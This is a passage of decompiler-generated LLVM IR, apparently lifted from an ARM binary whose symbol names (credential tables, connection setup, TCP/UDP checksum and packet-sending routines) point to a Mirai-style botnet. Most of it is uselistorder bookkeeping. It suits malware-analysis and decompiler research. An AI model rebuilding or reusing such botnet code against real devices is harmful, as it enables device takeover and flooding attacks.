dec_label_pc_1024c:                               ; preds = %dec_label_pc_fe8c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_10250 = call i32 @table_lock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_10258 = call i32 @table_lock_val(i32 27)
  store i32 %v1_10258, i32* %r0.global-to-local, align 4
  %v0_1025c = load i32, i32* @r6, align 4
  %v1_1025c = add i32 %v0_1025c, 12
  %v2_1025c = inttoptr i32 %v1_1025c to i32*
  %v3_1025c = load i32, i32* %v2_1025c, align 4
  store i32 %v3_1025c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f4bc.backedge

dec_label_pc_10264:                               ; preds = %dec_label_pc_f574
  store i32 %v0_f0e8, i32* @r1, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 104, i32* %v2_f104, align 4
  br label %dec_label_pc_f590

dec_label_pc_10274:                               ; preds = %dec_label_pc_ebc4
  store i32 ptrtoint (i32* @global_var_24d6c.154 to i32), i32* %ip.global-to-local, align 4
  %v2_10278 = load i32, i32* @global_var_24d6c.154, align 4
  store i32 %v2_10278, i32* %r0.global-to-local, align 4
  %v1_1027c = call i32 @__GI___libc_close(i32 %v2_10278)
  store i32 %v1_1027c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10280

dec_label_pc_10280:                               ; preds = %dec_label_pc_eba0, %dec_label_pc_10274
  %v0_10280 = load i32, i32* @r5, align 4
  store i32 %v0_10280, i32* %r0.global-to-local, align 4
  %v1_10284 = call i32 @__GI_exit(i32 %v0_10280)
  store i32 %v1_10284, i32* %r0.global-to-local, align 4
  ret i32 %v1_10284

; uselistorder directives
  uselistorder i32 %v3_1025c, { 1, 0 }
  uselistorder i32 %v0_1025c, { 1, 0 }
  uselistorder i32 %v3_10130, { 1, 0 }
  uselistorder i32 %v0_1012c, { 1, 0, 2 }
  uselistorder i32 %v3_100e0, { 1, 0 }
  uselistorder i32 %v1_100d4, { 1, 0 }
  uselistorder i32 %v1_100cc, { 1, 2, 0 }
  uselistorder i1 %v9_100c4, { 1, 0 }
  uselistorder i32 %v0_100d4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_10088, { 2, 1, 0, 3 }
  uselistorder i32 %v3_10084, { 1, 0 }
  uselistorder i32 %v0_1007c, { 1, 0 }
  uselistorder i32 %v3_fff8, { 1, 0 }
  uselistorder i32 %v1_ffb8, { 2, 1, 0 }
  uselistorder i32 %v0_ff34.pr, { 1, 0 }
  uselistorder i32 %v0_ff00, { 1, 2, 0 }
  uselistorder i32 %v4_fea0, { 1, 0, 2 }
  uselistorder i1 %v7_fe7c, { 1, 0 }
  uselistorder i32 %v1_fe24, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fe24, { 0, 2, 1 }
  uselistorder i32 %v0_fe1c, { 1, 0 }
  uselistorder i1 %v7_fe18, { 1, 0 }
  uselistorder i1 %v7_fe10, { 1, 0 }
  uselistorder i1 %v7_fe08, { 1, 0 }
  uselistorder i1 %v8_fe00, { 1, 0 }
  uselistorder i1 %v7_fde4, { 1, 0 }
  uselistorder i1 %v7_fddc, { 1, 0 }
  uselistorder i1 %v7_fdd4, { 1, 0 }
  uselistorder i1 %v8_fdcc, { 1, 0 }
  uselistorder i32 %v1_fdb4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_fd50, { 1, 0 }
  uselistorder i8 %v3_fd48, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fd40, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fd40, { 0, 2, 1 }
  uselistorder i32 %v0_fd38, { 1, 0 }
  uselistorder i1 %v7_fd34, { 1, 0 }
  uselistorder i1 %v7_fd2c, { 1, 0 }
  uselistorder i1 %v7_fd24, { 1, 0 }
  uselistorder i1 %v7_fd10, { 1, 0 }
  uselistorder i1 %v7_fd08, { 1, 0 }
  uselistorder i1 %v7_fd00, { 1, 0 }
  uselistorder i1 %v8_fcf8, { 1, 0 }
  uselistorder i32 %v1_fce0, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v4_fc88, { 1, 0, 2 }
  uselistorder i32 %v1_fc54, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_fc54, { 0, 2, 1 }
  uselistorder i32 %v0_fc4c, { 1, 0 }
  uselistorder i1 %v7_fc48, { 1, 0 }
  uselistorder i1 %v7_fc40, { 1, 0 }
  uselistorder i1 %v8_fc38, { 1, 0 }
  uselistorder i1 %v7_fc1c, { 1, 0 }
  uselistorder i1 %v7_fc14, { 1, 0 }
  uselistorder i1 %v8_fc0c, { 1, 0 }
  uselistorder i32 %v1_fbf4, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v8_fb90, { 1, 0 }
  uselistorder i8 %v3_fb88, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fb80, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fb80, { 0, 2, 1 }
  uselistorder i32 %v0_fb78, { 1, 0 }
  uselistorder i1 %v7_fb74, { 1, 0 }
  uselistorder i1 %v7_fb6c, { 1, 0 }
  uselistorder i1 %v7_fb64, { 1, 0 }
  uselistorder i1 %v7_fb50, { 1, 0 }
  uselistorder i1 %v7_fb48, { 1, 0 }
  uselistorder i1 %v7_fb40, { 1, 0 }
  uselistorder i1 %v8_fb38, { 1, 0 }
  uselistorder i32 %v1_fb20, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_fa40, { 1, 0 }
  uselistorder i8 %v3_fa38, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fa30, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_fa30, { 0, 2, 1 }
  uselistorder i32 %v0_fa28, { 1, 0 }
  uselistorder i1 %v7_fa24, { 1, 0 }
  uselistorder i1 %v7_fa1c, { 1, 0 }
  uselistorder i1 %v7_fa14, { 1, 0 }
  uselistorder i1 %v7_fa00, { 1, 0 }
  uselistorder i1 %v7_f9f8, { 1, 0 }
  uselistorder i1 %v7_f9f0, { 1, 0 }
  uselistorder i1 %v8_f9e8, { 1, 0 }
  uselistorder i32 %v1_f9d0, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f96c, { 1, 0 }
  uselistorder i8 %v3_f964, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f95c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f95c, { 0, 2, 1 }
  uselistorder i32 %v0_f954, { 1, 0 }
  uselistorder i1 %v7_f950, { 1, 0 }
  uselistorder i1 %v7_f948, { 1, 0 }
  uselistorder i1 %v7_f940, { 1, 0 }
  uselistorder i1 %v7_f92c, { 1, 0 }
  uselistorder i1 %v7_f924, { 1, 0 }
  uselistorder i1 %v7_f91c, { 1, 0 }
  uselistorder i1 %v8_f914, { 1, 0 }
  uselistorder i32 %v1_f8fc, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f8e8, { 1, 0 }
  uselistorder i32 %v1_f8e0, { 1, 0 }
  uselistorder i32 %v1_f8d8, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_f8d4, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_f8d4, { 0, 2, 1 }
  uselistorder i32 %v0_f8b4.pr, { 1, 0 }
  uselistorder i32 %v0_f894.pr, { 1, 0 }
  uselistorder i1 %v7_f86c, { 1, 0 }
  uselistorder i1 %v2_f85c, { 1, 0, 2 }
  uselistorder i1 %v2_f840, { 1, 0, 2 }
  uselistorder i32 %v1_f860, { 1, 2, 3, 0 }
  uselistorder i32 %v1_f834, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_f864, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1 %v8_f7c8, { 1, 0 }
  uselistorder i8 %v3_f7c0, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f7b8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f7b8, { 0, 2, 1 }
  uselistorder i32 %v0_f7b0, { 1, 0 }
  uselistorder i1 %v7_f7ac, { 1, 0 }
  uselistorder i1 %v7_f7a4, { 1, 0 }
  uselistorder i1 %v7_f79c, { 1, 0 }
  uselistorder i1 %v7_f788, { 1, 0 }
  uselistorder i1 %v7_f780, { 1, 0 }
  uselistorder i1 %v7_f778, { 1, 0 }
  uselistorder i1 %v8_f770, { 1, 0 }
  uselistorder i32 %v1_f758, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_f744, { 1, 2, 0 }
  uselistorder i32 %v2_f730, { 1, 0 }
  uselistorder i32 %v0_f730, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_f72c, { 2, 1, 4, 0, 5, 3 }
  uselistorder i1 %v7_f6b8, { 1, 0 }
  uselistorder i32 %v3_f6b4, { 1, 0, 2, 3 }
  uselistorder i1 %v2_f6a0, { 1, 0 }
  uselistorder i32 %.465, { 1, 0 }
  uselistorder i1 %v7_f688, { 1, 0 }
  uselistorder i32 %v0_f684, { 2, 1, 0, 3 }
  uselistorder i1 %v7_f65c, { 1, 0 }
  uselistorder i32 %v0_f65c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_f5cc, { 2, 0, 3, 4, 5, 1 }
  uselistorder i1 %v1_f5b0, { 1, 0 }
  uselistorder i32 %v1_f5a0, { 2, 1, 0 }
  uselistorder i32 %v1_f59c, { 1, 0 }
  uselistorder i32 %v0_f53c, { 2, 5, 6, 20, 7, 8, 24, 9, 10, 21, 11, 12, 25, 13, 14, 22, 15, 16, 23, 4, 3, 19, 17, 18, 26, 27, 1, 0 }
  uselistorder i32 %v1_f518, { 1, 2, 3, 0 }
  uselistorder i32 %v3_f514, { 1, 0 }
  uselistorder i32 %v4_f4f8, { 0, 4, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v2_f4e4, { 1, 0, 2 }
  uselistorder i32 %v3_f4e0, { 1, 0, 2 }
  uselistorder i32 %v0_10008, { 1, 0, 2 }
  uselistorder i32 %v3_f4a8, { 1, 0 }
  uselistorder i32 %v1_f490, { 3, 2, 1, 0 }
  uselistorder i32 %v3_f48c, { 1, 0 }
  uselistorder i32 %v3_f484, { 1, 2, 0 }
  uselistorder i1 %v7_f474, { 1, 0 }
  uselistorder i32 %v3_f470, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_f464, { 1, 0 }
  uselistorder i32 %v1_f40c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f40c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f3f0, { 0, 2, 1 }
  uselistorder i32 %v1_f3e8, { 1, 0 }
  uselistorder i32 %v1_f3a8, { 2, 1, 0 }
  uselistorder i32 %v1_f3a4, { 1, 0 }
  uselistorder i1 %v2_f384, { 1, 0, 2 }
  uselistorder i32 %v0_f380, { 1, 0, 2 }
  uselistorder i1 %v7_f34c, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_f34c, { 1, 0, 2 }
  uselistorder i32 %v2_f344, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_f338, { 1, 0, 2 }
  uselistorder i32 %v0_f33c, { 1, 0 }
  uselistorder i32 %v1_f320, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_f314, { 0, 1, 3, 2 }
  uselistorder i32 %v0_f314, { 0, 2, 1 }
  uselistorder i32 %v1_f304, { 1, 0 }
  uselistorder i32 %v3_f3d0, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %v1_f264, { 1, 0 }
  uselistorder i32 %v1_f24c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_f258, { 0, 3, 2, 1 }
  uselistorder i32 %v0_f208, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i32 %v5_f1fc, { 2, 1, 0 }
  uselistorder i32 %v1_f1dc, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_f1b8, { 1, 0 }
  uselistorder i1 %v9_f184, { 1, 0 }
  uselistorder i32* %v2_f104, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_f0e8, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_f0d4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_f084, { 1, 0 }
  uselistorder i32 %v5_f01c, { 1, 0 }
  uselistorder i32 %v3_f00c, { 1, 2, 0 }
  uselistorder i16 %v4_f008, { 1, 0 }
  uselistorder i32 %v3_f008, { 1, 0 }
  uselistorder i1 %v2_ef44, { 1, 0 }
  uselistorder i1 %v2_ef30, { 1, 0 }
  uselistorder i1 %v2_ef1c, { 1, 0 }
  uselistorder i32 %.464, { 2, 1, 0 }
  uselistorder i1 %v7_eef8, { 2, 1, 0, 5, 4, 3 }
  uselistorder i1 %v2_eee0, { 1, 0 }
  uselistorder i1 %v3_eec4, { 1, 0, 2 }
  uselistorder i1 %v2_eeb0, { 1, 0 }
  uselistorder i1 %v2_ee8c, { 1, 0 }
  uselistorder i32 %v1_ee3c, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 31, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_ee28, { 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 30, 31, 32, 29, 28, 27, 26, 25, 24, 23, 22, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_ee24, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v0_ee0c, { 1, 0 }
  uselistorder i32 %stack_var_-1880.0, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10170, { 2, 3, 1, 0 }
  uselistorder i32 %v2_f674, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32 %v2_fe40, { 4, 5, 1, 0, 12, 13, 8, 11, 7, 10, 9, 6, 3, 2 }
  uselistorder i32 %v2_fee8, { 1, 2, 0 }
  uselistorder i32 %v2_f3dc, { 0, 5, 1, 4, 2, 7, 3, 6 }
  uselistorder i32 %v2_edcc, { 2, 3, 6, 5, 7, 0, 1, 4, 8, 9 }
  uselistorder i32 %v4_ec9c, { 2, 1, 0, 3 }
  uselistorder i16 %v5_ec30.le, { 1, 0 }
  uselistorder i32 %v0_ec14, { 3, 2, 0, 1 }
  uselistorder i32 %v2_ebe8, { 3, 2, 0, 1 }
  uselistorder i1 %v7_ebb4, { 1, 0 }
  uselistorder i32 %v3_ebac, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %v0_eb98, { 1, 0 }
  uselistorder i32 %v2_eb7c, { 1, 0, 2 }
  uselistorder i32 %v0_eb68, { 1, 2, 0 }
  uselistorder i32 %storemerge329, { 1, 0 }
  uselistorder i32 %v0_eadc, { 3, 2, 1, 0, 4 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-60, { 10, 11, 12, 0, 1, 13, 5, 14, 2, 15, 6, 16, 3, 17, 4, 18, 7, 19, 20, 8, 21, 9, 22 }
  uselistorder i32* %r3.global-to-local, { 75, 63, 64, 65, 66, 67, 68, 69, 70, 76, 77, 78, 79, 80, 81, 82, 83, 84, 86, 85, 87, 114, 42, 1, 2, 3, 43, 44, 45, 46, 47, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 18, 16, 17, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40, 41, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 57, 59, 60, 61, 62, 71, 0, 72, 73, 74, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 139, 140, 142, 141, 138, 143, 165, 166, 144, 145, 164, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 113, 162, 163, 88, 89, 90, 91, 92, 93, 94, 95, 97, 96, 99, 98, 107, 100, 101, 102, 103, 104, 105, 106, 108, 109, 110, 111, 112 }
  uselistorder i32* %r2.global-to-local, { 35, 36, 37, 38, 39, 40, 41, 42, 51, 52, 53, 82, 27, 43, 0, 1, 28, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 31, 32, 33, 34, 44, 45, 46, 47, 48, 49, 50, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 97, 80, 81, 99, 100, 102, 101, 98, 118, 103, 119, 104, 116, 117, 105, 106, 107, 108, 109, 110, 111, 112, 113, 96, 114, 115, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79 }
  uselistorder i32* %r1.global-to-local, { 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0, 60, 61, 62, 35, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 106, 37, 38, 39, 40, 41, 42, 90, 91, 54, 53, 55, 56, 57, 58, 59, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89 }
  uselistorder i32* %r0.global-to-local, { 131, 130, 133, 132, 2, 4, 3, 5, 80, 82, 81, 84, 83, 86, 85, 88, 87, 89, 91, 90, 92, 93, 94, 95, 96, 97, 99, 98, 101, 100, 102, 0, 103, 137, 134, 135, 136, 1, 138, 104, 178, 66, 68, 67, 106, 105, 107, 32, 7, 6, 9, 8, 11, 10, 12, 69, 14, 13, 15, 17, 16, 19, 18, 20, 21, 22, 23, 24, 26, 25, 28, 27, 30, 29, 31, 34, 33, 36, 35, 208, 37, 39, 38, 40, 41, 42, 44, 43, 46, 45, 48, 47, 49, 51, 50, 52, 54, 53, 56, 55, 57, 58, 60, 59, 62, 61, 64, 63, 65, 71, 70, 72, 74, 73, 76, 75, 78, 77, 79, 108, 111, 109, 110, 113, 112, 115, 114, 116, 118, 117, 119, 121, 120, 122, 124, 123, 125, 126, 127, 128, 192, 177, 181, 179, 180, 187, 182, 183, 184, 129, 185, 186, 188, 190, 189, 191, 193, 198, 194, 197, 195, 196, 201, 199, 200, 204, 202, 203, 206, 205, 176, 175, 207, 139, 140, 142, 141, 144, 143, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 164, 163, 165, 170, 166, 167, 168, 169, 171, 172, 173, 174 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 11, 14, 12, 13, 15, 23, 16, 17, 18, 19, 20, 21, 22, 10, 4, 5, 6, 7, 8, 9 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 204, 190, 181, 30, 110, 114, 115, 129, 130, 112, 113, 79, 80, 81, 82, 83, 1, 121, 3, 4, 5, 11, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 21, 22, 23, 18, 19, 20, 24, 25, 26, 27, 28, 29, 185, 31, 36, 32, 33, 34, 35, 37, 38, 39, 40, 41, 45, 46, 47, 42, 43, 44, 48, 49, 50, 51, 52, 53, 57, 58, 59, 54, 55, 56, 60, 61, 62, 63, 64, 65, 69, 70, 71, 66, 67, 68, 72, 73, 74, 75, 76, 77, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 126, 101, 102, 103, 98, 99, 100, 104, 105, 106, 107, 108, 109, 116, 117, 118, 119, 120, 184, 122, 123, 124, 125, 193, 195, 194, 196, 197, 198, 199, 200, 201, 202, 203, 127, 128, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 217, 219, 220, 218, 215, 216, 111, 78, 191, 221, 192, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 189, 149, 150, 188, 151, 152, 187, 153, 154, 155, 156, 157, 158, 186, 159, 160, 161, 162, 163, 183, 164, 165, 166, 182, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 0, 180 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 202, 190, 181, 30, 108, 109, 128, 112, 113, 129, 114, 80, 81, 82, 83, 1, 186, 3, 4, 5, 11, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 21, 22, 23, 18, 19, 20, 24, 25, 26, 27, 28, 29, 185, 31, 36, 32, 33, 34, 35, 37, 38, 39, 40, 41, 45, 46, 47, 42, 43, 44, 48, 49, 50, 51, 52, 53, 57, 58, 59, 54, 55, 56, 60, 61, 62, 63, 64, 65, 69, 70, 71, 66, 67, 68, 72, 73, 74, 75, 76, 77, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 125, 99, 100, 101, 96, 97, 98, 102, 103, 104, 105, 106, 107, 116, 117, 118, 119, 120, 184, 121, 122, 123, 124, 191, 193, 192, 194, 195, 196, 197, 198, 199, 200, 201, 126, 127, 203, 204, 205, 206, 207, 208, 209, 210, 213, 215, 216, 214, 211, 212, 79, 78, 110, 217, 111, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 189, 148, 149, 188, 150, 151, 187, 152, 153, 154, 155, 156, 157, 183, 158, 159, 160, 161, 162, 182, 163, 164, 165, 0, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 115, 180 }
  uselistorder i32 (i32, i32)* @resolv_entries_free, { 1, 0 }
  uselistorder i16** @global_var_22280.146, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_22280.146 to i16*), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 7, 8, 2, 3, 4, 5 }
  uselistorder i32 251, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_197a8.208 to i32), { 5, 7, 2, 8, 6, 9, 3, 10, 0, 11, 1, 12, 4, 13 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 15, 14, 13, 12, 11, 10, 9, 19, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 18, 17, 16, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 6, 7, 8, 9, 2, 3, 4, 5, 10, 11 }
  uselistorder i8 34, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 36, { 0, 1, 2, 3, 14, 15, 16, 17, 4, 5, 18, 19, 20, 21, 6, 7, 8, 9, 10, 11, 12, 13, 22, 23, 24, 25 }
  uselistorder i8 35, { 0, 1, 2, 3, 16, 17, 18, 19, 4, 5, 6, 7, 20, 21, 22, 23, 8, 9, 10, 11, 12, 13, 14, 15, 24, 25, 26, 27 }
  uselistorder i8 58, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13, 14, 15 }
  uselistorder i8 57, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 62, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 61, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i32 (i32)* @inet_addr, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_19704.97 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @resolv_lookup, { 1, 0 }
  uselistorder i32 ptrtoint ([22 x i8]* @global_var_196ec.91 to i32), { 0, 2, 1 }
  uselistorder i32 (i32)* @table_lock_val, { 40, 39, 27, 26, 33, 38, 37, 36, 35, 34, 32, 31, 30, 29, 28, 25, 24, 0, 22, 21, 20, 23, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 37, 13, 14, 15, 12, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32 (i32)* @table_unlock_val, { 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 0, 18, 17, 16, 19, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 0, 2, 1 }
  uselistorder i32 284, { 3, 0, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @setup_connection, { 2, 1, 0 }
  uselistorder i32 254, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i8 5, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 9, 8, 7, 6, 0, 5, 4, 3, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 2, 9, 8, 7, 6, 0, 5, 4, 3, 1 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32* @global_var_2226c.201, { 1, 0 }
  uselistorder i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_22268.159 to i32), i32 2) to i16*), { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 2, 11, 10, 9, 8, 0, 7, 6, 5, 4, 3, 1 }
  uselistorder i16* bitcast (i32* @global_var_2225e.198 to i16*), { 1, 0, 2 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 9, 10, 15, 16, 13, 14, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_19788.192 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_19780.190 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_19744.178 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_19720.170 to i32), { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint (i32* @global_var_19724.168 to i32), { 1, 2, 0, 3 }
  uselistorder i8* @global_var_22275.165, { 1, 0 }
  uselistorder i16* @global_var_2226a.164, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2, 3 }
  uselistorder i32 5888, { 2, 0, 3, 1 }
  uselistorder i8 6, { 2, 3, 4, 0, 1 }
  uselistorder i8 16, { 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i16* @global_var_22268.159, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16* @global_var_22268.159 to i32), { 5, 2, 1, 0, 4, 3 }
  uselistorder i8* @global_var_22274.160, { 1, 0 }
  uselistorder i32 10240, { 1, 0, 2 }
  uselistorder i8** @global_var_22254.156, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_22254.156 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1 }
